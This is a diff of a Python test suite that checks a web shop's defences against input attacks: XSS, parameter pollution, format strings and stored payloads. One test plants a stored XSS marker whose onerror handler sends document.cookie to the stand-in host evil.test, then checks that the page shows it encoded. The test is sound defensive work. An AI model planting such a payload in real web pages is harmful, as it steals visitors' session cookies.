@@ -14,6 +14,8 @@ from unittest import mock
 
 from test_auth_wstg import ALICE, ALICE_PW, Base, token_of  # noqa: F401  (sets the secure-mode test env)
 
+from app.db import get_db
+
 BOB, BOB_PW = "bob", "Bob-Purple-Tractor-3"
 ADMIN, ADMIN_PW = "admin", "Adm1n-Correct-Horse-9"
 CATEGORY = "خواربار ایرانی"
@@ -30,6 +32,11 @@ class InpvBase(Base):
         c = self.app.test_client()
         self.assertEqual(self.login(user, pw, c).status_code, 302)
         return c
+
+    def run_sql(self, sql, *a):
+        with self.app.app_context():
+            get_db().execute(sql, a)
+            get_db().commit()
 
     def count(self, table):
         return self.q(f"SELECT COUNT(*) FROM {table}")[0][0]
@@ -57,12 +64,17 @@ class TestINPV01ReflectedXSS(InpvBase):
 
 
 class TestINPV02StoredXSS(InpvBase):
-    def review(self, c, body, rating="5", product=1):
+    def review(self, c, body, rating="5", product=1, fresh=False):
+        # The Phase 5 rules (one review per product, 3/hour, purchase required) are tested in
+        # test_busl_wstg.py. `fresh` clears alice's earlier review so these tests stay about input.
+        if fresh:
+            self.run_sql("DELETE FROM reviews WHERE product_id = ? AND user_id = 2", product)
+            self.run_sql("DELETE FROM auth_attempts WHERE kind = 'review'")
         return self.post(f"/product/{product}/review", {"body": body, "rating": rating}, c, f"/product/{product}")
 
     def test_review_is_stored_as_typed_and_encoded_for_every_viewer(self):
         alice = self.as_user(ALICE, ALICE_PW)
-        self.assertEqual(self.review(alice, XSS).status_code, 302)
+        self.assertEqual(self.review(alice, XSS, fresh=True).status_code, 302)
         self.assertEqual(self.q("SELECT body FROM reviews ORDER BY id DESC LIMIT 1")[0][0], XSS)
         for viewer in (alice, self.as_user(BOB, BOB_PW), self.app.test_client()):
             body = self.text(viewer.get("/product/1"))
@@ -117,8 +129,8 @@ class TestINPV03VerbTampering(InpvBase):
 
 
 class TestINPV04ParameterPollution(InpvBase):
-    def add(self, c, qty, page="/product/1"):
-        return self.post("/cart/add/1", {"qty": qty}, c, page)
+    def add(self, c, qty, page="/product/2"):
+        return self.post("/cart/add/2", {"qty": qty}, c, page)  # product 2: no per-customer limit
 
     def cart(self, c):
         with c.session_transaction() as s:
@@ -136,13 +148,13 @@ class TestINPV04ParameterPollution(InpvBase):
             self.add(c, bad)
         self.assertEqual(self.cart(c), {})
         self.add(c, "3")
-        self.assertEqual(self.cart(c), {"1": 3})
+        self.assertEqual(self.cart(c), {"2": 3})
 
     def test_cart_line_total_is_capped_across_requests(self):
         c = self.app.test_client()
         self.add(c, "6")
         self.add(c, "6")
-        self.assertEqual(self.cart(c), {"1": 6})
+        self.assertEqual(self.cart(c), {"2": 6})
 
     def test_unknown_product_cannot_be_added(self):
         c = self.app.test_client()
@@ -291,6 +303,8 @@ class TestINPV13FormatStrings(InpvBase):
     def test_format_specifiers_are_plain_text_everywhere(self):
         alice = self.as_user(ALICE, ALICE_PW)
         for payload in self.PAYLOADS:
+            self.run_sql("DELETE FROM reviews WHERE product_id = 1 AND user_id = 2")  # one review per customer (BUSL-05)
+            self.run_sql("DELETE FROM auth_attempts WHERE kind IN ('review', 'contact')")
             self.post("/product/1/review", {"body": payload, "rating": "5"}, alice, "/product/1")
             self.post("/contact", {"name": payload, "email": "a@example.com", "message": payload}, page="/contact")
             pages = [self.text(alice.get("/product/1")), self.text(self.c.get("/search", query_string={"q": payload}))]
@@ -305,11 +319,12 @@ class TestINPV14IncubatedVulnerabilities(InpvBase):
     def test_planted_payloads_stay_inert_for_later_visitors(self):
         alice = self.as_user(ALICE, ALICE_PW)
         marker = '<img src=x onerror="fetch(\'//evil.test/\'+document.cookie)">'
-        self.post("/product/2/review", {"body": marker, "rating": "5"}, alice, "/product/2")
+        self.run_sql("DELETE FROM reviews WHERE product_id = 1 AND user_id = 2")  # alice bought product 1 (BUSL-06)
+        self.post("/product/1/review", {"body": marker, "rating": "5"}, alice, "/product/1")
         self.post("/contact", {"name": "Eve", "email": "eve@example.com", "message": marker}, page="/contact")
         admin = self.as_user(ADMIN, ADMIN_PW)
         for client in (self.as_user(BOB, BOB_PW), admin, self.app.test_client()):
-            body = self.text(client.get("/product/2"))
+            body = self.text(client.get("/product/1"))
             self.assertNotIn("<img src=x", body)
             self.assertIn("&lt;img src=x", body)
 
